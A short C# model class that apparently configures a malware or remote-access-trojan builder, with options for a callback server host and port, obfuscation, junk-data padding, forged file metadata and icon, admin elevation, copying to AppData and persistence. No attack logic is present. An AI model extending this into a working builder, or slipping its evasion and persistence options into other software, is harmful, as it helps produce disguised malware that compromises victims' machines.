namespace LibraNextgen.Common.Models;

public class BuildConfigRequest
{
    public string Platform { get; set; } = "x64";
    public string ApplicationType { get; set; } = "Console";
    public string ServerHost { get; set; } = "127.0.0.1";
    public int ServerPort { get; set; } = 5270;
    public bool EnableObfuscation { get; set; }
    public bool InjectJunkData { get; set; }
    public int JunkDataMb { get; set; } = 10;
    public string? IconUrl { get; set; }
    public string? CompanyName { get; set; }
    public string? FileDescription { get; set; }
    public string? ProductName { get; set; }
    public string? Copyright { get; set; }
    public string? FileVersion { get; set; }
    public bool TrimUnused { get; set; } = true;
    public bool RequireAdmin { get; set; }
    public bool CopyToAppData { get; set; }
    public bool EnablePersistence { get; set; }
}
